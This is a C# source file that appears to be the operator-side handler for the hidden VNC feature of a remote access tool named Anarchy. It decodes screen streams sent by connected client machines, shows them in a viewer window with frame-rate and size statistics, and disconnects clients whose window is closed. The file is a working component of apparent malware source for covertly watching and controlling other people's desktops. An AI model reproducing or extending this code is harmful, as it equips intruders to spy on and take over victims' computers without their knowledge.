using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Anarchy.Forms;
using Anarchy.Helpers.Helper;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    internal class HandleHVNC
    {
        public void Capture(Clients client, MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "setClient":
                    var setClient = (FormHVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                    try
                    {
                        setClient.Client = client;
                        setClient.timer1.Start();
                        byte[] RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                        Bitmap decoded0 = setClient.decoder.DecodeData(new MemoryStream(RdpStream0));
                        setClient.rdSize = decoded0.Size;
                        int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                    }
                    catch
                    {

                    }
                    break;
                case "Start":
                    break;
                case "State":
                    try
                    {
                        FormHVNC RD = (FormHVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (RD != null)
                        {
                            //RD.LabelStatusShow.Text = unpack_msgpack.ForcePathObject("State").AsString;
                        }
                    }
                    catch
                    {

                    }
                    break;
                case "Error":
                    try
                    {
                        FormHVNC RD = (FormHVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (RD != null)
                        {
                            //RD.LabelStatusShow.Text = unpack_msgpack.ForcePathObject("State").AsString;
                        }
                    }
                    catch
                    {

                    }
                    break;
                case "Screen":
                    try
                    {
                        FormHVNC RD = (FormHVNC)Application.OpenForms["HVNC:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (RD != null)
                            {
                                byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                lock (RD.syncPicbox)
                                {
                                    using (MemoryStream stream = new MemoryStream(RdpStream))
                                    {
                                        RD.rdSize = (RD.GetImage = RD.decoder.DecodeData(stream)).Size;
                                    }
                                    RD.pictureBox1.Image = RD.GetImage;
                                    RD.FPS++;
                                    if (RD.sw.ElapsedMilliseconds >= 1000L)
                                    {
                                        string[] obj;
                                        obj = new string[10] { "HVNC:", client.ID, "    FPS:", null, null, null, null, null, null, null };
                                        int fPS;
                                        fPS = RD.FPS;
                                        obj[3] = fPS.ToString();
                                        obj[4] = "    Screen:";
                                        obj[5] = RD.GetImage.Width.ToString();
                                        obj[6] = " x ";
                                        obj[7] = RD.GetImage.Height.ToString();
                                        obj[8] = "    Size:";
                                        obj[9] = Methods.BytesToString(RdpStream.Length);
                                        RD.Text = string.Concat(obj);
                                        RD.FPS = 0;
                                        RD.sw = Stopwatch.StartNew();
                                    }
                                    return;
                                }
                            }
                            else
                            {
                                client.Disconnected();
                                return;
                            }
                        }
                        catch (Exception ex) { Debug.WriteLine(ex.Message); }
                    }
                    catch { }
                    break;
                case "Stop":
                    break;
            }
        }
    }
}
